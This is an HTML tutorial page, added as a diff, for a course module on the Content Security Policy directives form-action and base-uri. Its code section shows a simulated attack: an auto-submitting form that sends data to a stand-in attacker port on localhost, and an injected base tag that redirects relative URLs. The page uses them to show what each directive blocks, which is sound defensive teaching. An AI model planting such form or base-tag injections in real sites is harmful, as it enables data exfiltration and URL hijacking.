@@ -1,0 +1,182 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Module 13 — form-action + base-uri Lockdown</title>
+<link rel="stylesheet" href="../../assets/course.css">
+<style>:root { --accent: #56d364; }</style>
+</head>
+<body>
+
+<h1><span class="module-kicker">Track 1 · Phase 2 · Module 13</span>form-action + base-uri Lockdown</h1>
+
+<h2 id="prereq">00 — Prerequisites</h2>
+<div class="prereq-bar">
+  <span class="prereq-label">You should already know:</span>
+  <a class="tag-link" href="../12_frame_ancestors_clickjacking/tutorial.html">Module 12: frame-ancestors</a>
+  <a class="tag-link" href="../11_csp_blocks_reflected_xss/tutorial.html">Module 11: CSP Blocks Reflected XSS</a>
+</div>
+
+<h2 id="analogy">01 — The Big Analogy</h2>
+<div class="analogy-box">
+<p>
+<code>form-action</code> is a mail room that checks the destination address
+on every outgoing envelope before it leaves the building — no matter what
+someone wrote on the envelope's contents, if the address isn't on the
+approved list, it never gets mailed. <code>base-uri</code> is a completely
+different, subtler attack: imagine every unaddressed envelope in the
+building defaults to a "return address" stamp defined once, at the front
+desk. If someone sneaks in and swaps that front-desk stamp, EVERY
+unaddressed envelope in the building — ones that were never individually
+tampered with — now silently goes to the wrong place. <code>base-uri</code>
+protects the stamp itself, not any individual envelope.
+</p>
+</div>
+
+<h2 id="steps">02 — What Happens, Step by Step</h2>
+<ol class="step-list">
+  <li><strong>form-action:</strong> a page auto-submits a real <code>&lt;form&gt;</code> pointing at a different origin. Without CSP, the browser navigates there, carrying the form's data.</li>
+  <li>With <code>form-action 'self'</code>, the browser checks the form's target against the policy the moment submission is attempted — blocks it, fires a violation, and the page never navigates.</li>
+  <li><strong>base-uri:</strong> a page's HTML includes an (attacker-simulated) <code>&lt;base href="..."&gt;</code> tag pointing at a different origin, followed by a relative <code>&lt;img src="pixel.png"&gt;</code>.</li>
+  <li>Without CSP, the browser honors the injected <code>&lt;base&gt;</code> tag — the relative image request actually goes to the attacker's origin.</li>
+  <li>With <code>base-uri 'self'</code>, the browser refuses to apply the injected <code>&lt;base&gt;</code> tag at all — <code>document.baseURI</code> falls back to the document's own real URL, and the relative image resolves against the real origin instead.</li>
+</ol>
+
+<h2 id="map">03 — State Map</h2>
+<div class="diagram-frame">
+<svg viewBox="0 0 700 260" xmlns="http://www.w3.org/2000/svg">
+  <g font-family="JetBrains Mono, monospace" font-size="11" fill="#c9d1d9">
+    <rect x="10" y="20" width="330" height="100" rx="8" fill="#161b22" stroke="#f85149" stroke-width="2"/>
+    <text x="175" y="42" text-anchor="middle" fill="#fff" font-size="12">/form-open</text>
+    <text x="25" y="65">form.requestSubmit() →</text>
+    <text x="25" y="85" fill="#f85149">tab navigates to :6901/receive</text>
+    <text x="25" y="103">?amount=1000</text>
+
+    <rect x="360" y="20" width="330" height="100" rx="8" fill="#161b22" stroke="#3fb950" stroke-width="2"/>
+    <text x="525" y="42" text-anchor="middle" fill="#fff" font-size="12">/form-protected</text>
+    <text x="375" y="65">form.requestSubmit() →</text>
+    <text x="375" y="85" fill="#3fb950">BLOCKED, no navigation</text>
+    <text x="375" y="103">stays on :6900/form-protected</text>
+
+    <rect x="10" y="140" width="330" height="100" rx="8" fill="#161b22" stroke="#f85149" stroke-width="2"/>
+    <text x="175" y="162" text-anchor="middle" fill="#fff" font-size="12">/base-open</text>
+    <text x="25" y="185">document.baseURI =</text>
+    <text x="25" y="203" fill="#f85149">"http://localhost:6901/"</text>
+    <text x="25" y="221">pixel.png fetched from :6901</text>
+
+    <rect x="360" y="140" width="330" height="100" rx="8" fill="#161b22" stroke="#3fb950" stroke-width="2"/>
+    <text x="525" y="162" text-anchor="middle" fill="#fff" font-size="12">/base-protected</text>
+    <text x="375" y="185">document.baseURI =</text>
+    <text x="375" y="203" fill="#3fb950">"http://localhost:6900/base-protected"</text>
+    <text x="375" y="221">pixel.png fetched from :6900</text>
+  </g>
+</svg>
+</div>
+
+<h2 id="code">04 — The Code, Explained</h2>
+<p>The form that either exfiltrates data or doesn't — <a href="server.js">server.js</a>:</p>
+<pre><code>&lt;form id="xfer-form" action="http://localhost:${ATTACK_PORT}/receive" method="GET"&gt;
+  &lt;input type="hidden" name="amount" value="1000"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('xfer-form').requestSubmit();&lt;/script&gt;</code></pre>
+<p>The injected tag that either hijacks every relative URL or doesn't:</p>
+<pre><code>&lt;base href="http://localhost:${ATTACK_PORT}/"&gt;
+...
+&lt;img src="pixel.png"&gt; &lt;!-- relative — resolves against whatever base wins --&gt;</code></pre>
+
+<h2 id="limits">05 — Limits / What You Cannot Do Yet</h2>
+<div class="compare-box">
+  <div class="cant">
+    <h4>✗ CAN'T DO YET</h4>
+    <ul>
+      <li>Stop a form from submitting to an ABSOLUTE URL written directly by a legitimate developer — `form-action` restricts the target, not who wrote the form</li>
+      <li>Prevent the `&lt;base&gt;` tag injection itself — that's an HTML-injection bug, a separate problem from what happens once it exists</li>
+      <li>Recover a form submission or navigation that already happened before the policy could apply</li>
+    </ul>
+  </div>
+  <div class="can">
+    <h4>✓ CAN DO</h4>
+    <ul>
+      <li>Stop any form on the page — including ones injected by an attacker — from submitting to an untrusted origin</li>
+      <li>Neutralize an entire class of attack (base-tag hijacking) that would otherwise silently redirect every relative URL on the page, with zero changes to any individual link</li>
+      <li>Verify both defenses via the actual real-world consequence (a real navigation, a real network request), not just a console message</li>
+    </ul>
+  </div>
+</div>
+
+<h2 id="run">06 — Run It</h2>
+<div class="run-block">
+  <div class="run-label">from track1-csp-core/13_form_action_base_uri/</div>
+  <pre><code>node server.js</code></pre>
+</div>
+<p>Visit all four routes at <code>http://localhost:6900</code>. Real captured results:</p>
+<div class="run-block">
+  <div class="run-label">verified</div>
+  <pre><code>/form-open      → navigates to http://localhost:6901/receive?amount=1000
+/form-protected → stays put, "BLOCKED: form-action"
+/base-open      → document.baseURI = "http://localhost:6901/", pixel.png from :6901
+/base-protected → document.baseURI = "http://localhost:6900/base-protected", pixel.png from :6900</code></pre>
+</div>
+<div class="callout warn">
+  <span class="label">Getting a blank or broken result?</span>
+  If `/form-protected` still navigates away, double check the CSP header
+  actually reads `form-action 'self'` in your network tab's response
+  headers — a common typo is writing `form-src` instead, which is a
+  DIFFERENT (older, narrower, largely superseded) directive name.
+</div>
+
+<h2 id="exercise">07 — Brain Exercise</h2>
+<details class="exercise-box">
+<summary>Think it through before revealing</summary>
+<p>
+A page has NO injection vulnerability anywhere — every `&lt;base&gt;` tag,
+every form, every link is entirely under the developer's own control,
+written by hand, never touched by user input. Does `base-uri`/`form-action`
+still provide any real value on that page?
+</p>
+<p><strong>Reveal the answer:</strong></p>
+<p>
+Yes, though the value shifts from "stops an active attack" to "reduces
+blast radius if something else goes wrong later." Software changes over
+time — a future contributor might add a feature that echoes user input
+somewhere nobody expected, a dependency might introduce its own injection
+bug, a build tool might mistakenly inline untrusted content. `base-uri`
+and `form-action` don't assume the rest of the page is perfect; they assume
+it might not stay that way, and cap the damage a NEW, not-yet-discovered
+bug could do. This is the same defense-in-depth argument from Module 11's
+Brain Exercise, applied to two more attack shapes: CSP earns its keep most
+when something else has already gone wrong.
+</p>
+</details>
+
+<h2 id="qa">08 — There Are No Dumb Questions</h2>
+<div class="qa-item">
+  <div class="q">Q: Why did `document.baseURI` fall back to the page's FULL URL (including path), not just its origin?</div>
+  <p>Because that's what `document.baseURI` resolves to when there's no effective `&lt;base&gt;` element at all — the document's own address IS the default base for resolving every relative URL on it, path included. `base-uri 'self'` didn't substitute some other default; it simply prevented the injected tag from overriding what was already the correct, ordinary default.</p>
+</div>
+<div class="qa-item">
+  <div class="q">Q: Could `form-action` have a value like `'self' https://payment-processor.example` for a real checkout flow?</div>
+  <p>Yes — exactly the intended real-world shape. Most sites need forms to submit to at least one trusted third party (a payment processor, an OAuth provider). `form-action` supports the same source-expression list syntax as every other directive; `'none'` and `'self'`-only are just the strictest possible choices, appropriate for this module's demonstration.</p>
+</div>
+<div class="qa-item">
+  <div class="q">Q: Does `base-uri` affect absolute URLs anywhere on the page?</div>
+  <p>No — an absolute URL (`https://example.com/thing`) never consults the base at all; only genuinely relative references (`thing`, `./thing`, `../thing`) do. This is exactly why the attack is dangerous: it doesn't touch any URL directly, it only changes what "relative" resolves against, silently, for every relative reference on the page at once.</p>
+</div>
+
+<h2 id="next">09 — What's Next</h2>
+<p>
+Track 1 is complete — 13 modules, one real browser, zero claims taken on
+faith. Track 2 begins now: Trusted Types, built as an application layer on
+top of one specific CSP directive you've already used the mechanics of
+(<code>require-trusted-types-for</code>), closing the one class of DOM-XSS
+that <code>script-src</code> alone — as Module 14 will show — cannot touch.
+</p>
+
+<div class="module-nav">
+  <div class="prev"><a href="../12_frame_ancestors_clickjacking/tutorial.html">← Module 12: frame-ancestors Clickjacking Defense</a></div>
+  <div class="next"><a href="../../track2-trusted-types/14_dom_xss_sink_baseline/tutorial.html">Module 14: DOM-XSS Sink Baseline →</a></div>
+</div>
+
+<footer class="course-footer">Track 1 · CSP Core Engine · Module 13 of 13 — Track 1 complete</footer>
+</body>
+</html>
